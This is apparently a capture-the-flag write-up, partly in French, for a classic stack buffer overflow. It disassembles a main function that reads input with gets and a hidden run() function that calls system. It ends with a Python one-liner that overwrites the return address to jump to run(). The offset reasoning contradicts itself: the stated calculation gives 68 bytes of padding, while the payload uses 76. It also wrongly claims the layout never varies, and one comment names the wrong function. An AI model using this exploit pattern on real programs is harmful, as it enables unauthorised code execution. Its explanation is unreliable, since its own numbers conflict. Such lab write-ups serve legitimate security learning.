```bash

Breakpoint 1, 0x08048483 in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
=> 0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp #80 b of space for a buffer 
   0x08048489 <+9>:	lea    0x10(%esp),%eax #&0x10
   0x0804848d <+13>:	mov    %eax,(%esp) #arg for puts (my buffer)
   0x08048490 <+16>:	call   0x8048340 <gets@plt> 
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.

```



## How to capture the flag

- We can provoke a buffer overflow, if our input is langer than the buffer's allocated memory. Buffer overflow will erase the return adresse. We just have to jump to the hidden function to capture the flag


## Run function 


08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00 
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret   




### Calcul buffer:
```
buffer        (64 octets)
old ebp       (4 octets)   ← pushé par push %ebp
adresse retour (4 octets)  ← pushé par call main
```

**C'est toujours dans cet ordre, sans exception.**

---

### Le calcul
```
début buffer  (esp+16)
+ 64 octets   (buffer)
+ 4 octets    (old ebp)
= 68 octets de padding avant l'adresse de retour


## La formule 

``` python
python -c "print 'A'*76 + '\x44\x84\x04\x08'"
```




